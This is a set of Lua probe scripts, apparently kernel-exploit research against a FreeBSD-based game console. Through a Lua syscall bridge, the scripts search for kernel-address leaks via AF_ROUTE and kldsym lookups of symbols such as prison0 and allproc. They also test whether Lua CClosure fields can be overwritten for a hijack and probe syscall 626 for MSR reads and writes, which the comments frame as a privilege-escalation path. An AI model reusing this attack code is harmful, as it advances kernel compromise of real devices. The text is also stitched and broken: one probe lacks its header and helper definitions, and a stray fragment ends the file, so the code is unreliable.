## probes/phase13_53batch/53a_aio_retest.lua

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 53a: Repeat the 43p AIO survival matrix with a resumable start index.
-- Reopens: results/43p_aio_bypass_20261016_180656.txt is truncated at call 1;
-- results/phase2_kernel_objects/19g_aio_debug_20261015_193320.txt records aio_error rv=-1.
-- This probe records syscall returns; it cannot identify why an external capture stops.

local START_AT = 1 -- If a run stops at call N, set this to N+1 to test the remainder.

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function safe_wd(addr, val)
    return pcall(function() memory.write_dword(addr, val) end)
end

local zero = uint64(0)
local timespec = memory.alloc(16)
safe_wd(timespec, 0)
safe_wd(timespec + 4, 0)
safe_wd(timespec + 8, 0)
safe_wd(timespec + 12, 0)
local iocb_out = memory.alloc(8)
safe_wd(iocb_out, 0)
safe_wd(iocb_out + 4, 0)

local matrix = {
    {num=317, name="aio_error", args=function() return {zero,zero,zero,zero,zero,zero} end},
    {num=316, name="aio_cancel", args=function() return {zero,zero,zero,zero,zero,zero} end},
    {num=314, name="aio_return", args=function() return {zero,zero,zero,zero,zero,zero} end},
    {num=315, name="aio_suspend", args=function() return {zero,zero,uint64(timespec),zero,zero,zero} end},
    {num=255, name="aio_read", args=function() return {zero,zero,zero,zero,zero,zero} end},
    {num=256, name="aio_write", args=function() return {zero,zero,zero,zero,zero,zero} end},
    {num=257, name="lio_listio", args=function() return {zero,zero,zero,zero,zero,zero} end},
    {num=359, name="aio_waitcomplete", args=function() return {uint64(iocb_out),uint64(timespec),zero,zero,zero,zero} end},
    {num=465, name="aio_fsync", args=function() return {zero,zero,zero,zero,zero,zero} end},
    {num=543, name="aio_mlock", args=function() return {zero,zero,zero,zero,zero,zero} end},
}

print("=== PROBE 53a: AIO RETEST ===")
print(string.format("matrix=%d start_at=%d", #matrix, START_AT))
if START_AT < 1 or START_AT > #matrix then
    print("ERROR: START_AT is outside the matrix")
    return
end

local returned = 0
local lua_errors = 0
for i = START_AT, #matrix do
    local item = matrix[i]
    print(string.format("[%d/%d] %s (syscall %d): BEFORE call", i, #matrix, item.name, item.num))
    local args = item.args()
    local sc = make_syscall(item.num)
    local ok, ret = pcall(function()
        return sc(args[1], args[2], args[3], args[4], args[5], args[6])
    end)
    if ok then
        local rv = signed32(ret)
        print(string.format("[%d/%d] %s: RETURNED ret=%d", i, #matrix, item.name, rv))
        returned = returned + 1
    else
        -- A Lua pcall error is not evidence that the console process was killed.
        print(string.format("[%d/%d] %s: LUA-ERROR %s", i, #matrix, item.name, tostring(ret)))
        lua_errors = lua_errors + 1
    end
end

print(string.format("AIO matrix reached end: returned=%d lua_errors=%d", returned, lua_errors))
print("Interpretation: a returned -1 is a syscall result; a missing tail remains unexplained without console-side evidence.")
if returned == (#matrix - START_AT + 1) then
    print("ALL AIO CALLS RETURNED (see per-call rets)")
else
    print("NOT ALL AIO CALLS RETURNED THROUGH THE WRAPPER; inspect per-call status and capture tail")
end
print("=== PROBE 53a COMPLETE ===")
```

## probes/phase13_53batch/53b_afroute_retest.lua

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 53b: Rebuild AF_ROUTE RTM_GET headers and classify each response.
-- Reopens: results/43o_afroute_kaslr_20261016_180647.txt records write ret=-1;
-- its 108-byte read echoed the request (sockaddr began at +0x5C, matching hdr=92).
-- A successful write or a pointer-shaped value is a candidate observation, not a finding.

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end

local function safe_wb(addr, val)
    return pcall(function() memory.write_byte(addr, val % 256) end)
end

local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local function put_u16(addr, value)
    safe_wb(addr, value)
    safe_wb(addr + 1, math.floor(value / 256))
end

local function put_u32(addr, value)
    safe_wb(addr, value)
    safe_wb(addr + 1, math.floor(value / 0x100))
    safe_wb(addr + 2, math.floor(value / 0x10000))
    safe_wb(addr + 3, math.floor(value / 0x1000000))
end

local function read_u16(addr)
    return (safe_rb(addr) or 0) + 256 * (safe_rb(addr + 1) or 0)
end

local function read_u32(addr)
    return (safe_rb(addr) or 0) + 0x100 * (safe_rb(addr + 1) or 0)
        + 0x10000 * (safe_rb(addr + 2) or 0) + 0x1000000 * (safe_rb(addr + 3) or 0)
end

local function make_buf(size)
    local buf = memory.alloc(size)
    for i = 0, size - 1 do safe_wb(buf + i, 0) end
    return buf
end

local function make_request(hdr, seq, pid)
    local total = hdr + 16
    local msg = make_buf(total)
    put_u16(msg, total)            -- rtm_msglen
    safe_wb(msg + 2, 5)            -- RTM_VERSION
    safe_wb(msg + 3, 4)            -- RTM_GET
    put_u32(msg + 8, 0x1)          -- RTF_UP
    put_u32(msg + 0x0C, 0x1)       -- RTA_DST
    put_u32(msg + 0x10, pid)       -- rtm_pid
    put_u32(msg + 0x14, seq)       -- rtm_seq
    put_u32(msg + 0x18, 0)         -- rtm_errno
    safe_wb(msg + hdr, 16)         -- sockaddr_in.sin_len
    safe_wb(msg + hdr + 1, 2)      -- sockaddr_in.sin_family = AF_INET
    -- Remaining sockaddr bytes stay zero: destination 0.0.0.0.
    return msg, total
end

local function same_bytes(a, b, length)
    for i = 0, length - 1 do
        local av = safe_rb(a + i)
        local bv = safe_rb(b + i)
        if av == nil or bv == nil then return nil end
        if av ~= bv then return false end
    end
    return true
end

local function inspect_response(buf, length, sent, sent_len)
    local kind
    local identical = same_bytes(buf, sent, math.min(length, sent_len))
    if length == sent_len and identical == true then
        kind = "ECHO of own request (rejected as a response)"
    elseif length <= sent_len and length > 0 and identical == true then
        kind = "PARTIAL PREFIX ECHO (not established as a response)"
    elseif identical == nil then
        kind = "UNCLASSIFIED (response bytes could not all be read)"
    else
        kind = "CANDIDATE RESPONSE (inspect fields and provenance)"
    end
    print("  response kind: " .. kind)
    if length >= 28 then
        print(string.format("  header: msglen=%d version=%d type=%d flags=0x%X addrs=0x%X pid=%d seq=%d errno=%d",
            read_u16(buf), safe_rb(buf + 2) or 0, safe_rb(buf + 3) or 0,
            read_u32(buf + 8), read_u32(buf + 0x0C), read_u32(buf + 0x10),
            read_u32(buf + 0x14), read_u32(buf + 0x18)))
    else
        print("  response shorter than 28-byte parse window; header fields not classified")
    end

    local count = 0
    for off = 0, length - 8, 8 do
        local q = safe_rq(buf + off)
        if q then
            local hi, lo = get_hi_lo(q)
            if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF then
                count = count + 1
                print(string.format("  pointer-shaped qword +0x%03X: %08X_%08X (candidate)", off, hi, lo))
            end
        end
    end
    print("  pointer-shaped qwords: " .. count .. " (requires independent validation)")

    local dump_len = math.min(length, 160)
    for row = 0, dump_len - 1, 16 do
        local hex = ""
        for col = 0, 15 do
            if row + col < dump_len then hex = hex .. string.format("%02X ", safe_rb(buf + row + col) or 0) end
        end
        print(string.format("  +%03X: %s", row, hex))
    end
    return kind
end

print("=== PROBE 53b: AF_ROUTE RTM_GET RETEST ===")
local sc_socket = make_syscall(97)
local sc_write = make_syscall(4)
local sc_recvmsg = make_syscall(27)
local sc_close = make_syscall(6)
local sc_getpid = make_syscall(20)
local MSG_DONTWAIT = 0x80

local pid = 0
local pid_ok, pid_ret = pcall(function() return sc_getpid() end)
if pid_ok then pid = to_num(pid_ret) end
print("pid=" .. pid)

print("BEFORE socket(PF_ROUTE=17, SOCK_RAW=3, protocol=0)")
local sock_ok, fd_ret = pcall(function()
    return sc_socket(uint64(17), uint64(3), uint64(0), uint64(0), uint64(0), uint64(0))
end)
local fd = sock_ok and signed32(fd_ret) or -1
print(string.format("socket result: %s fd=%d", sock_ok and "RETURNED" or "LUA-ERROR", fd))
if fd < 0 then
    print("CONCLUSION: route socket unavailable; RTM_GET delivery not tested")
    print("=== PROBE 53b COMPLETE ===")
    return
end

print("Receive mode: recvmsg(MSG_DONTWAIT=0x80); prior probes report F_SETFL as cosmetic")

local function recv_nonblocking(buf, size)
    local iov = memory.alloc(16)
    local mh = memory.alloc(64)
    for off = 0, 56, 8 do memory.write_qword(mh + off, uint64(0)) end
    memory.write_qword(iov, uint64(buf))
    memory.write_qword(iov + 8, uint64(size))
    memory.write_qword(mh + 16, uint64(iov)) -- msg_iov
    memory.write_qword(mh + 24, uint64(1))   -- msg_iovlen
    return sc_recvmsg(uint64(fd), uint64(mh), uint64(MSG_DONTWAIT))
end

local delivered = 0
local response_kinds = {}
for index, hdr in ipairs({120, 92, 152}) do
    local msg, total = make_request(hdr, index, pid)
    print(string.format("variant hdr=%d msglen=%d: BEFORE write(fd=%d)", hdr, total, fd))
    local write_ok, write_ret = pcall(function()
        return sc_write(uint64(fd), uint64(msg), uint64(total), uint64(0), uint64(0), uint64(0))
    end)
    local wrv = write_ok and signed32(write_ret) or -999
    print(string.format("variant hdr=%d: write result=%s ret=%d", hdr, write_ok and "RETURNED" or "LUA-ERROR", wrv))

    if write_ok and wrv > 0 then
        delivered = delivered + 1
        local response_seen = false
        for attempt = 1, 5 do
            local rbuf = make_buf(4096)
            print(string.format("variant hdr=%d read attempt %d/5: BEFORE recvmsg(MSG_DONTWAIT)", hdr, attempt))
            local read_ok, read_ret = pcall(function()
                return recv_nonblocking(rbuf, 4096)
            end)
            local rlen = read_ok and signed32(read_ret) or -999
            print(string.format("variant hdr=%d read attempt %d: %s ret=%d",
                hdr, attempt, read_ok and "RETURNED" or "LUA-ERROR", rlen))
            if read_ok and rlen > 0 then
                local safe_len = math.min(rlen, 4096)
                response_kinds[#response_kinds + 1] = inspect_response(rbuf, safe_len, msg, total)
                response_seen = true
                break
            end
        end
        if not response_seen then print(string.format("variant hdr=%d: no response captured in five non-blocking receives", hdr)) end
    else
        print(string.format("variant hdr=%d: WRITE FAILED (not delivered); response classification skipped", hdr))
    end
end

local control = make_buf(8)
put_u16(control, 8)
safe_wb(control + 2, 5)
safe_wb(control + 3, 4)
print("control msglen=8: BEFORE write")
local ctrl_ok, ctrl_ret = pcall(function()
    return sc_write(uint64(fd), uint64(control), uint64(8), uint64(0), uint64(0), uint64(0))
end)
print(string.format("control write: %s ret=%d", ctrl_ok and "RETURNED" or "LUA-ERROR", ctrl_ok and signed32(ctrl_ret) or -999))
pcall(function() sc_close(uint64(fd)) end)

if delivered == 0 then
    print("CONCLUSION: all RTM_GET writes failed; delivery and leak behavior remain untested")
else
    print(string.format("CONCLUSION: %d RTM_GET variant(s) returned a positive write; inspect response-kind lines before drawing a conclusion", delivered))
end
print("=== PROBE 53b COMPLETE ===")
```

```lua
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end

end

local function clear(buf, size)
    for off = 0, size - 1, 4 do safe_wd(buf + off, 0) end
end

local function report_stat(buf, size)
    local version = safe_rd(buf) or -1
    local name = ""
    for i = 0, 63 do
        local b = safe_rb(buf + 4 + i)
        if b and b > 0 and b < 128 then name = name .. string.char(b) else break end
    end
    print(string.format("  struct version=%d name=%s refs=%d id=%d",
        version, name, safe_rd(buf + 0x44) or -1, safe_rd(buf + 0x48) or -1))
    local addr = safe_rq(buf + 0x50)
    local sz = safe_rq(buf + 0x58)
    if addr then
        local hi, lo = get_hi_lo(addr)
        print(string.format("  address candidate=%08X_%08X", hi, lo))
        if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF then print("  KERNEL-RANGE CANDIDATE (not yet validated)") end
    end
    if sz then
        local hi, lo = get_hi_lo(sz)
        print(string.format("  size=%08X_%08X", hi, lo))
    end
    local count = 0
    for off = 0, size - 8, 8 do
        local q = safe_rq(buf + off)
        if q then
            local hi, lo = get_hi_lo(q)
            if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF then
                count = count + 1
                print(string.format("  pointer-shaped qword +0x%02X=%08X_%08X (candidate)", off, hi, lo))
            end
        end
    end
    print("  pointer-shaped qwords=" .. count)
end

local function dump(buf, length)
    for row = 0, length - 1, 16 do
        local hex = ""
        for col = 0, 15 do
            if row + col < length then hex = hex .. string.format("%02X ", safe_rb(buf + row + col) or 0) end
        end
        print(string.format("  +%03X: %s", row, hex))
    end
end

print("=== PROBE 53c: KLDSTAT/KLDSYM RETEST ===")
local stat_buf = memory.alloc(0x100)
local fileids = {1, 3}

for _, sysnum in ipairs({308, 367}) do
    local sc = make_syscall(sysnum)
    for _, fileid in ipairs(fileids) do
        clear(stat_buf, 0x100)
        safe_wd(stat_buf, 0x70)
        print(string.format("kldstat candidate syscall=%d fileid=%d version=0x70: BEFORE call", sysnum, fileid))
        local ok, ret = pcall(function() return sc(uint64(fileid), uint64(stat_buf)) end)
        local rv = ok and signed32(ret) or -999
        print(string.format("kldstat syscall=%d fileid=%d: %s ret=%d", sysnum, fileid, ok and "RETURNED" or "LUA-ERROR", rv))
        if ok and rv == 0 then report_stat(stat_buf, 0x100) end
    end

    clear(stat_buf, 0x100)
    safe_wd(stat_buf, 0x70)
    print(string.format("kldstat candidate syscall=%d fileid=1 stat=NULL: BEFORE call", sysnum))
    local null_ok, null_ret = pcall(function() return sc(uint64(1), uint64(0)) end)
    print(string.format("kldstat syscall=%d stat=NULL: %s ret=%d", sysnum,
        null_ok and "RETURNED" or "LUA-ERROR", null_ok and signed32(null_ret) or -999))

    clear(stat_buf, 0x100)
    safe_wd(stat_buf, 0x60)
    print(string.format("kldstat candidate syscall=%d fileid=1 version=0x60: BEFORE call", sysnum))
    local size_ok, size_ret = pcall(function() return sc(uint64(1), uint64(stat_buf)) end)
    local size_rv = size_ok and signed32(size_ret) or -999
    print(string.format("kldstat syscall=%d version=0x60: %s ret=%d", sysnum, size_ok and "RETURNED" or "LUA-ERROR", size_rv))
    if size_ok then
        local modified = false
        for off = 4, 0x5F do
            local b = safe_rb(stat_buf + off)
            if b and b ~= 0 then modified = true; break end
        end
        print("  bytes after version modified: " .. tostring(modified))
        if modified then
            dump(stat_buf, 0x60)
            report_stat(stat_buf, 0x60)
        end
    end
end

local name_buf = memory.alloc(128)
local lookup_buf = memory.alloc(64)
local sc_kldsym = make_syscall(337)
local symbols = {"prison0", "allproc", "kernel_pmap", "copyin", "copyout",
    "rootvnode", "sysent", "kern_securelevel", "printf", "bzero"}

local function write_string(buf, value)
    for i = 1, #value do safe_wb(buf + i - 1, string.byte(value, i)) end
    safe_wb(buf + #value, 0)
end

for _, fileid in ipairs({1, 0}) do
    for _, symbol in ipairs(symbols) do
        clear(lookup_buf, 64)
        safe_wd(lookup_buf, 32)
        write_string(name_buf, symbol)
        safe_wq(lookup_buf + 8, uint64(name_buf))
        print(string.format("kldsym(337) fileid=%d symbol=%s: BEFORE call", fileid, symbol))
        local ok, ret = pcall(function()
            return sc_kldsym(uint64(fileid), uint64(1), uint64(lookup_buf))
        end)
        local rv = ok and signed32(ret) or -999
        print(string.format("kldsym fileid=%d symbol=%s: %s ret=%d", fileid, symbol, ok and "RETURNED" or "LUA-ERROR", rv))
        if ok and rv == 0 then
            local value = safe_rq(lookup_buf + 16)
            local size = safe_rq(lookup_buf + 24)
            if value then
                local hi, lo = get_hi_lo(value)
                print(string.format("  symbol value candidate=%08X_%08X", hi, lo))
                if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF then print("  KERNEL-RANGE SYMBOL CANDIDATE (validate independently)") end
            end
            if size then
                local hi, lo = get_hi_lo(size)
                print(string.format("  symbol size=%08X_%08X", hi, lo))
            end
        end
    end
end

print("Interpretation: syscall returns, structure changes, and validated addresses are separate evidence levels.")
print("=== PROBE 53c COMPLETE ===")
```

## probes/phase13_53batch/53d_cclosure_retest.lua

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 53d: Recheck CClosure qword offsets, especially the untested +0 field.
-- Reopens: results/47b_cclosure_hijack_20261016_200459.txt; its write loop
-- tested {16,24,32,40,48}, while its +0 interpretation conflicts internally.
-- Each sentinel is restored immediately. This probe does not redirect or call a changed pointer.

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local function fmt_addr(val)
    if val == nil then return "UNREADABLE" end
    local hi, lo = get_hi_lo(val)
    return string.format("%08X_%08X", hi, lo)
end

local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end

local function same_qword(a, b)
    if a == nil or b == nil then return false end
    local ah, al = get_hi_lo(a)
    local bh, bl = get_hi_lo(b)
    return ah == bh and al == bl
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)") or s:match(":%s*([0-9a-fA-F][0-9a-fA-F]+)%s*$")
    if hex then return uint64("0x" .. hex), hex end
    return nil, nil
end

print("=== PROBE 53d: CCLOSURE OFFSET RETEST ===")
local mt = getmetatable(syscall.pipe)
if type(mt) ~= "table" or type(mt.__call) ~= "function" then
    print("ERROR: syscall.pipe.__call CClosure unavailable")
    print("=== PROBE 53d COMPLETE ===")
    return
end

local fn_obj, fn_hex = parse_func_addr(mt.__call)
if not fn_obj then
    print("ERROR: could not parse CClosure address from " .. tostring(mt.__call))
    print("=== PROBE 53d COMPLETE ===")
    return
end
print("CClosure address=0x" .. fn_hex)
print("Offsets tested: 0,8,16,24,32,40,48. No redirect/call is attempted.")

local gc_ok = pcall(function() collectgarbage("stop") end)
if not gc_ok then
    print("ERROR: could not stop Lua GC; skipping writes to avoid changing a live GC object")
    print("=== PROBE 53d COMPLETE ===")
    return
end
print("Lua GC stopped for the short sentinel/write/restore sequence")

local sentinel = uint64("0xDEADC0DEDEADC0DE")
local counts = {writable=0, readonly=0, unknown=0, unreadable=0, restore_failed=0}
local offset_classes = {}

for _, off in ipairs({0, 8, 16, 24, 32, 40, 48}) do
    local slot = fn_obj + off
    local old = safe_rq(slot)
    if old == nil then
        counts.unreadable = counts.unreadable + 1
        offset_classes[off] = "UNREADABLE"
        print(string.format("+0x%02X: UNREADABLE", off))
    else
        print(string.format("+0x%02X: BEFORE write old=%s", off, fmt_addr(old)))
        local write_ok = safe_wq(slot, sentinel)
        local readback = safe_rq(slot)
        local class
        if not write_ok or readback == nil then
            class = "WRITE-UNKNOWN"
        elseif same_qword(readback, sentinel) then
            class = "WRITABLE"
        elseif same_qword(readback, old) then
            class = "READ-ONLY (write ignored)"
        else
            class = "WRITE-UNKNOWN"
        end

        -- Restore immediately before formatting or testing another offset.
        local restore_ok = safe_wq(slot, old)
        local restored = safe_rq(slot)
        if not restore_ok or not same_qword(restored, old) then
            counts.restore_failed = counts.restore_failed + 1
            class = "RESTORE-FAILED (original value not confirmed)"
        end

        offset_classes[off] = class
        if class == "WRITABLE" then
            counts.writable = counts.writable + 1
        elseif class == "READ-ONLY (write ignored)" then
            counts.readonly = counts.readonly + 1
        else
            counts.unknown = counts.unknown + 1
        end
        print(string.format("+0x%02X: old=%s readback=%s class=%s restored=%s",
            off, fmt_addr(old), fmt_addr(readback), class, tostring(restore_ok and same_qword(restored, old))))
    end
end

local gc_restart_ok = pcall(function() collectgarbage("restart") end)
print("Lua GC restart: " .. tostring(gc_restart_ok))
print(string.format("SUMMARY: writable=%d read-only=%d unknown=%d unreadable=%d restore_failed=%d",
    counts.writable, counts.readonly, counts.unknown, counts.unreadable, counts.restore_failed))
print("+0 verdict: " .. tostring(offset_classes[0] or "UNKNOWN"))
print("A writable offset is a memory-write observation only; control-flow impact remains untested.")
print("=== PROBE 53d COMPLETE ===")
```

## probes/phase14_final_push/54a2_rdmsr_precise.lua

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 54a2: Precise RDMSR via sys 626 with verified calling convention
--
-- Binary analysis of 13.60 handler at offset 0x604cf0 reveals:
--   - Stack frame 0x118 bytes, zeroes 32 qwords
--   - Dispatches on [rsi]-1 via jump table (cmd values 1-6)
--   - cmd=1 path: sub-function at 0x9e9f5000 computes ecx = counter_idx*2 + 0xC0010231
--     then executes RDMSR, returns result in eax:edx
--   - Post-dispatch: stores 8-byte result at [rbp-0x128], copyout to user ptr from arg[3]
--
-- Exact signature: sys626(cmd, counter_idx, narg_count, output_ptr, 0)
-- Where cmd=1 reads AMD PMC MSR at index (0xC0010231 + counter_idx*2)
--
-- AMD PMC MSRs (Family 17h/19h Zen):
--   0xC0010200-0xC001020B: PerfEvtSel0-5 (event select)
--   0xC0010201-0xC001020B: PerfCtr0-5 (counter values, odd indices)
--   0xC0010230-0xC001023B: L3PmcCfg/L3PmcCtr (L3 cache PMC)
--   0xC0010240-0xC001024B: Data Fabric PMC
--
-- The sub-function formula: MSR = 0xC0010231 + counter_idx * 2
-- So counter_idx=0 -> MSR 0xC0010231 (PerfCtr0 high? or L3 related)
-- counter_idx=1 -> MSR 0xC0010233
-- etc.
-- These are performance counter VALUES - may leak timing/execution info

print("=== PROBE 54a2: PRECISE RDMSR VIA SYS 626 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local sc626 = make_syscall(626)
local outbuf = memory.alloc(0x100)

-- Phase 1: Test cmd=1 (RDMSR path) with counter indices 0-15
-- Formula: MSR = 0xC0010231 + idx*2
-- idx=0: 0xC0010231, idx=1: 0xC0010233, ..., idx=7: 0xC001023F
-- idx=8: 0xC0010241, ..., idx=15: 0xC001024F
print("[*] Phase 1: cmd=1 RDMSR, counter indices 0-15")
print("    MSR formula: 0xC0010231 + idx*2")
print("")

for idx = 0, 15 do
    local msr = 0xC0010231 + idx * 2
    for i = 0, 0x1F, 4 do safe_wd(outbuf + i, 0xDEADBEEF) end

    local ok, ret = pcall(function()
        return sc626(uint64(1), uint64(idx), uint64(5), uint64(outbuf), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf)
        local q1 = safe_rq(outbuf + 8)
        local sentinel = (safe_rd(outbuf) == 0xDEADBEEF)
        print(string.format("  idx=%2d MSR=0x%08X  ret=%d  out=%s  out+8=%s%s",
            idx, msr, rv, hexval(q0), hexval(q1),
            sentinel and "  (UNCHANGED)" or "  <<< DATA"))

        if not sentinel and rv == 0 then
            local h, l = get_hi_lo(q0)
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print("  >>> KERNEL POINTER CANDIDATE: " .. hexval(q0))
            end
            if h > 0 or l > 0 then
                print("  >>> NON-ZERO PMC VALUE - counter is active!")
            end
        end
    else
        print(string.format("  idx=%2d MSR=0x%08X  CRASHED: %s", idx, msr, tostring(ret)))
    end
end
print("")

-- Phase 2: Test all 6 commands (1-6) with idx=0
print("[*] Phase 2: Testing all commands 1-6 with idx=0")
print("")
for cmd = 1, 6 do
    for i = 0, 0x1F, 4 do safe_wd(outbuf + i, 0xDEADBEEF) end

    local ok, ret = pcall(function()
        return sc626(uint64(cmd), uint64(0), uint64(5), uint64(outbuf), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf)
        local sentinel = (safe_rd(outbuf) == 0xDEADBEEF)
        print(string.format("  cmd=%d  ret=%d  out=%s%s",
            cmd, rv, hexval(q0), sentinel and "  (UNCHANGED)" or "  <<< DATA"))
    else
        print(string.format("  cmd=%d  CRASHED: %s", cmd, tostring(ret)))
    end
end
print("")

-- Phase 3: Test with narg_count variations (the 3rd arg)
-- Handler may validate arg count
print("[*] Phase 3: narg_count sensitivity (cmd=1, idx=0)")
print("")
for _, narg in ipairs({0, 1, 2, 3, 4, 5, 6, 7, 8}) do
    for i = 0, 0x1F, 4 do safe_wd(outbuf + i, 0xDEADBEEF) end

    local ok, ret = pcall(function()
        return sc626(uint64(1), uint64(0), uint64(narg), uint64(outbuf), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf)
        local sentinel = (safe_rd(outbuf) == 0xDEADBEEF)
        print(string.format("  narg=%d  ret=%d  out=%s%s",
            narg, rv, hexval(q0), sentinel and "  (UNCHANGED)" or "  <<< DATA"))
    else
        print(string.format("  narg=%d  CRASHED: %s", narg, tostring(ret)))
    end
end
print("")

-- Phase 4: WRMSR test - cmd=2 might be write
-- If we can WRITE MSRs, we could potentially:
-- - Redirect syscall entry (LSTAR/CSTAR)
-- - Modify segment bases
-- - Enable/disable features via EFER
-- TRY CAREFULLY: writing garbage to PMC config is low risk
print("[*] Phase 4: cmd=2 WRMSR test (write PMC config)")
print("    Writing 0 to idx=0 config register (safe: just disables counter)")
print("")
do
    -- First put the value we want to write at outbuf
    safe_wq(outbuf, uint64(0))

    local ok, ret = pcall(function()
        return sc626(uint64(2), uint64(0), uint64(5), uint64(outbuf), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        print("  cmd=2 write(0, idx=0) ret=" .. rv)
        if rv == 0 then
            print("  >>> WRMSR SUCCEEDED - we can WRITE MSRs!")
            print("  >>> This is a potential privilege escalation vector")
        end
    else
        print("  cmd=2 write CRASHED: " .. tostring(ret))
    end
end
print("")

-- Phase 5: If RDMSR works, try to read LSTAR/KERNEL_GS_BASE via other cmds
-- The base MSR formula gives us PMC range. But cmds 3-6 may use different
-- base MSRs or even allow arbitrary MSR index specification.
print("[*] Phase 5: Try other cmds with KASLR-useful MSR indices")
print("    If cmd dispatches to different MSR ranges...")
print("")

-- Try large counter indices that would map to interesting MSRs
-- Want: LSTAR at 0xC0000082, KERNEL_GS_BASE at 0xC0000102
-- Formula: MSR = 0xC0010231 + idx*2
-- For 0xC0000082: idx = (0xC0000082 - 0xC0010231) / 2 = negative (impossible)
-- So direct PMC path can't reach LSTAR.
-- But other commands (3-6) might have different base offsets!

for cmd = 3, 6 do
    for _, idx in ipairs({0, 1, 2, 3, 0x40, 0x41, 0x80, 0x81}) do
        for i = 0, 0x1F, 4 do safe_wd(outbuf + i, 0xDEADBEEF) end

        local ok, ret = pcall(function()
            return sc626(uint64(cmd), uint64(idx), uint64(5), uint64(outbuf), uint64(0))
        end)

        if ok then
            local rv = signed32(ret)
            local q0 = safe_rq(outbuf)
            local sentinel = (safe_rd(outbuf) == 0xDEADBEEF)
            if not sentinel or rv == 0 then
                print(string.format("  cmd=%d idx=%d  ret=%d  out=%s%s",
                    cmd, idx, rv, hexval(q0),
                    sentinel and "" or "  <<< DATA"))
                if not sentinel then
                    local h, l = get_hi_lo(q0)
                    if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                        print("  >>> KERNEL POINTER: " .. hexval(q0))
                    end
                end
            end
        else
            print(string.format("  cmd=%d idx=%d  CRASHED: %s", cmd, idx, tostring(ret)))
        end
    end
end
print("")

-- Phase 6: Read twice rapidly to detect counter activity
print("[*] Phase 6: PMC timing - read same counter twice")
print("")
for idx = 0, 3 do
    for i = 0, 0x1F, 4 do safe_wd(outbuf + i, 0) end
    local ok1, ret1 = pcall(function()
        return sc626(uint64(1), uint64(idx), uint64(5), uint64(outbuf), uint64(0))
    end)
    local val1 = safe_rq(outbuf)

    for i = 0, 0x1F, 4 do safe_wd(outbuf + i, 0) end
    local ok2, ret2 = pcall(function()
        return sc626(uint64(1), uint64(idx), uint64(5), uint64(outbuf), uint64(0))
    end)
    local val2 = safe_rq(outbuf)

    if ok1 and ok2 then
        print(string.format("  idx=%d: read1=%s  read2=%s  %s",
            idx, hexval(val1), hexval(val2),
            (hexval(val1) ~= hexval(val2)) and "CHANGING!" or "static"))
    end
end

print("")
print("=== PROBE 54a2 COMPLETE ===")
```

```lua
-- CRASH_CLASS: MODERATE
